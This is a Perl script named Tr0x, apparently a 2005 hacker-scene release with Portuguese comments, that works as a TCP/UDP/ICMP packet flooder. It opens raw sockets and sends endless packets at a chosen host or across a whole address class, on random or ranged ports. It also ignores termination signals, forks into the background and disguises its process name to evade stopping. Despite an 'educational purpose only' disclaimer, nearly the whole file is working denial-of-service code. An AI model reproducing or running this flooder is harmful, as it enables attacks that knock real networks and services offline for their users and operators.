#!/usr/bin/perl
use Socket;
###########################################
# Tr0x - by Thiago X                      #
#   This script is provided as proof of   #
#  concept for educational purpose only   #
#                                         #
# Greetz: BIGX333, C4nt1, Fusion, SOLDAD0 ##########
# Presente de dia das crianças pros Packet Kiddies ##################
# Versão 0.5 pra frente vai ser em inglês, quem não gostou, foda-se #
#####################################################################
my %Tr0x;
$Tr0x{'VERSION'} = '0.5b';
$Tr0x{'RLSDATA'} = '10.12.2005';
$Tr0x{'RLSTYPE'} = 'PUBLIC';
$Tr0x{'PORTA'}  = 0;
$Tr0x{'TEMPO'}  = 0;
$Tr0x{'LOOPS'}  = 0;
$Tr0x{'PACOTE'}  = 0;
$Tr0x{'MPORTAS'}  = 0;
$Tr0x{'PROCESSO'}  = 'Tr0x';

my %option = getopts ( TCP => 'T',
                       UDP => 'U',
                       ICMP => 'I',
                       DESTINO => 'd,:',
                       HOST => 'h,:',
                       TEMPO => 't,:',
                       PORTA => 'p,:',
                       INTERVALO => 'i,:',
                       LOOP => 'x,:',
                       DEBUG => 'D',
                       AJUDA => 'help'
                     );
inicia();

sub inicia{
    valida();
    setaprocesso();
    setaopcoes();
    print "Tr0x $Tr0x{'VERSION'} - Powered by Thiago X\n" if (defined($option{'DEBUG'}));
    criasocket();
    pacota();
}

sub setaprocesso {
    $SIG{"INT"} = "IGNORE";
    $SIG{"HUP"} = "IGNORE";
    $SIG{"TERM"} = "IGNORE";
    $SIG{"CHLD"} = "IGNORE";
    $SIG{"PS"} = "IGNORE";

    $0="$Tr0x{'PROCESSO'}"."\0"x16;;
    my $pid=fork;
    exit if $pid;
    die "Problema com o fork: $!" unless defined($pid);
}

sub valida{
    if( !@ARGV or defined( $option{'AJUDA'} ) ) {
        ajuda();
    }
    ajuda() if ( !defined( $option{'DESTINO'} ) && !defined($option{'HOST'}));
    ajuda() if ( !defined( $option{'TCP'} ) && !defined($option{'UDP'}) && !defined($option{'ICMP'}));
    ajuda() if(defined( $option{'HOST'}) && defined($option{'DESTINO'}));
}

sub setaopcoes {
    $Tr0x{'INTERVALO'}  = $option{'INTERVALO'} if (defined($option{'INTERVALO'}));
    $Tr0x{'DESTINO'}  = $option{'DESTINO'} if (defined($option{'DESTINO'}));
    $Tr0x{'PORTA'}  = $option{'PORTA'} if(defined($option{'PORTA'}));
    $Tr0x{'TEMPO'}  = $option{'TEMPO'} if(defined($option{'TEMPO'}));
    $Tr0x{'LOOPS'}  = $option{'LOOP'} if (defined($option{'LOOP'}));
    $Tr0x{'HOST'}  = $option{'HOST'} if (defined($option{'HOST'}));
    $Tr0x{'LOOPADO'} = 0;
    $Tr0x{'PACOTES'}  = 0;
    $Tr0x{'FIM'} = time + $Tr0x{'TEMPO'};
    @Tr0x{'PORTAS'} = split(',', $Tr0x{'PORTA'});
    if ($Tr0x{'PORTAS'}[1] != "") {
        $Tr0x{'MPORTAS'}  = 1;
        $Tr0x{'PORTAS'}[0] -= 1;
        $Tr0x{'PORTA'} = $Tr0x{'PORTAS'}[0];
        if (($Tr0x{'PORTAS'}[1] > $Tr0x{'PORTAS'}[0])) {
            $Tr0x{'PORTAS'}[1] = $Tr0x{'PORTAS'}[0];
        }
    }
    if ( defined($option{'HOST'} )) {
        $Tr0x{'ALVO'} = inet_aton("$option{'HOST'}");
    }
}   

sub criasocket {
    if (defined( $option{'TCP'})) {
        socket(Tr0xTCP, PF_INET, SOCK_RAW, TCP) or die "Error on TCP Socket";
    }
    if (defined( $option{'UDP'})) {
        socket(Tr0xUDP, PF_INET, SOCK_DGRAM, 17) or die "Error on UDP Socket";
    }
    if (defined( $option{'ICMP'})) {
        socket(Tr0xICMP, PF_INET, SOCK_RAW, 1) or die "Error on ICMP Socket";
    }
}

sub pacota {
    $Tr0x{'OK'} = "1";
    if ( !defined( $option{'DESTINO'} )) {
        enviapacotehost();
    } else {
        enviapacotedestino();
    }
}

sub ajuda {
    print "Tr0x $Tr0x{'VERSION'} by Thiago X [TCP/UDP/ICMP Packet flooder]\n";
    print "Usage: ./$0 [-D -T -U -I -h -d -p -t -i -x]\n\n";
    
    print "* $Tr0x{'RLSTYPE'} release, $Tr0x{'RLSDATA'}\n\n";

    print "    -D debug mode                                (no options         )\n";
    print "    -T TCP attack                                (no default         )\n";
    print "    -U UDP attack                                (no options         )\n";
    print "    -I ICMP attack                               (no options         )\n";
    print "    -h destination host/ip                       (no default         )\n";
    print "    -d destination class                         (no default         )\n";
    print "    -p destination port range [start,end]        (defaults to random )\n";
    print "    -t timeout                                   (defaults to forever)\n";
    print "    -i attack interval                           (defaults to forever)\n";
    print "    -x attack loops                              (defaults to forever)\n";

    exit;
} 

sub saioudorme {
    $Tr0x{'OK'} = "0";
    finaliza() if ((( !defined( $option{'INTERVALO'} ) && (time >= $Tr0x{'FIM'})) || ($Tr0x{'LOOPADO'} >= $Tr0x{'LOOPS'})));
    if (($Tr0x{'LOOPS'} != "0") && ($Tr0x{'LOOPADO'} < $Tr0x{'LOOPS'})) {
        sleep $Tr0x{'INTERVALO'} if (defined($option{'INTERVALO'}));
        $Tr0x{'LOOPADO'}++;
        pacota();
    } else {
        finaliza();
    }
}

sub enviapacotehost {
    my $pacote;
    while ($Tr0x{'OK'} == "1") {
        saioudorme() if ((time >= $Tr0x{'FIM'}) && ($Tr0x{'TEMPO'} != "0"));
        $pacote=$rand x $rand x $rand if(!defined($option{'TAMANHO'}));
        $Tr0x{'PORTA'} = int(rand 65000) +1 if ($Tr0x{'PORTA'} == "0");
        if ($Tr0x{'MPORTAS'}  == 1) {
            $Tr0x{'PORTA'} = $Tr0x{'PORTA'} + 1 if ($Tr0x{'PORTA'} < $Tr0x{'PORTAS'}[1]);
                if ($Tr0x{'PORTA'} >= $Tr0x{'PORTAS'}[1]) {
                    $Tr0x{'PORTA'} = $Tr0x{'PORTAS'}[0];
                }
        }
        send(Tr0xTCP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'TCP'}));
        send(Tr0xUDP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'UDP'}));
        send(Tr0xICMP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'ICMP'}));
    }
}

sub enviapacotedestino {
    my $pacote;
    while ($Tr0x{'OK'} == "1") {
        for (my $faixa = 1; $faixa <= 255; $faixa++) {
            saioudorme() if ((time >= $Tr0x{'FIM'}) && ($Tr0x{'TEMPO'} != "0"));
            $Tr0x{'ALVO'} = inet_aton("$Tr0x{'DESTINO'}.$faixa");
            $pacote=$rand x $rand x $rand if(!defined($option{'TAMANHO'}));
            $Tr0x{'PORTA'} = int(rand 65000) +1 if ($Tr0x{'PORTA'} == "0");
            if ($Tr0x{'MPORTAS'}  == 1)
            {
                $Tr0x{'PORTA'} = $Tr0x{'PORTA'} + 1 if ($Tr0x{'PORTA'} < $Tr0x{'PORTAS'}[1]);
                if ($Tr0x{'PORTA'} >= $Tr0x{'PORTAS'}[1]) {
                    $Tr0x{'PORTA'} = $Tr0x{'PORTAS'}[0];
                }
            }
            send(Tr0xTCP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'TCP'}));
            send(Tr0xUDP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'UDP'}));
            send(Tr0xICMP, 0, $pacote, sockaddr_in($Tr0x{'PORTA'}, $Tr0x{'ALVO'})) and $Tr0x{'PACOTES'}++ if (defined( $option{'ICMP'}));
            if ($faixa >= 255) {
                $faixa = 1;
            }
        }
    }
}

sub finaliza {
    if (defined($option{'DEBUG'})) {
        print "Timeout: $Tr0x{'TEMPO'}s\n";
        print "Interval: $Tr0x{'INTERVALO'}s\n" if (defined( $option{'INTERVALO'}));
        print "Loops: $Tr0x{'LOOPS'}x\n" if (defined( $option{'LOOP'}));
        print "Total Packets: $Tr0x{'PACOTES'}\n";
        print "Destination class Target: $Tr0x{'DESTINO'}\n" if (defined($option{'DESTINO'}));
        print "Destination Host/IP: $Tr0x{'HOST'}\n" if (defined($option{'HOST'}));
    }
    exit;
}

sub getopts {
  my %opts = @_;
  my %ret;
  if (defined($opts{STD})) {
     my @opts = split('', $opts{STD});
     for (my $c = 0; $c <= $#opts; $c++) {
       my $arg = $opts[$c];
       my $next_arg = $opts[$c+1];
       next if ($arg eq ":");
       $opts{$arg} = $arg;
       $opts{$arg} .= ",:" if ($next_arg eq ":");
     }
     delete($opts{STD});
  }
  for (my $ca = 0; $ca <= $#ARGV; $ca++) {
     my $arg = $ARGV[$ca];
     my $rarg = $arg;
     last if ($arg eq "--");
     my $next_arg = $ARGV[$ca+1];
     my ($is_arg, $next_is_arg) = (0, 0);
     $is_arg = 1 if ($arg =~ /^-{1,2}/);
     $arg =~ s/^-{1,2}//;
     $next_is_arg = 1 if ($next_arg =~ /^-{1,2}/);
     $next_arg =~ s/^-{1,2}//;
     next if ($is_arg == 0);
     my $value;
     if ($arg =~ /^(.+?)\=(.*)$/) {
        $arg = $1;
        $value = $2;
     }
     my $found = 0;
     foreach my $opt (keys(%opts)) {
        my $opt_value = $opts{$opt};
        my $get_value = 0;
        $get_value = 1 if ($opt_value =~ /\,(.*)$/);
        my @types = split('', $1);
        $opt_value =~ s/\,.*$//;
        my @get_opts = split(/\|/, $opt_value);
        if (grep { $_ eq $arg } @get_opts) {
           $found = 1;
           if ($get_value == 0) {
              $ret{$opt} = 1;
           } else {
               my $ret_value = ((defined($value)) ? $value : (defined($next_arg) ? $next_arg : undef));
               if (defined($ret_value)) {
                  if (!@types or grep { $_ eq ":" } @types) {
                    $ret{$opt} = $ret_value;
                  } else {
                     my @wrong;
                     foreach my $type (@types) {
                       my $ok = 1;
                       $ok = 0 if (
                          ($type eq "n" and $ret_value !~ /^\d+$/) or
                          ($type eq "i" and $ret_value !~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/));
                       push(@wrong, $type) if ($ok == 0);
                     }
                     if (@wrong) {
                       push(@{$ret{WRONG_VALUE}}, $rarg.','.join('', @wrong)); } else {
                         $ret{$opt} = $ret_value;
                     }
                  }
               } else {
                   push(@{$ret{MISS_VALUE}}, $rarg);
               }
           }
        } else {
           delete($ret{$opt}) if (not defined($ret{$opt}) and grep { $_ eq 'u' } @types);
        }
     }
     push(@{$ret{UNKNOWN}}, $rarg) if ($found == 0);
  }
  return(%ret);
}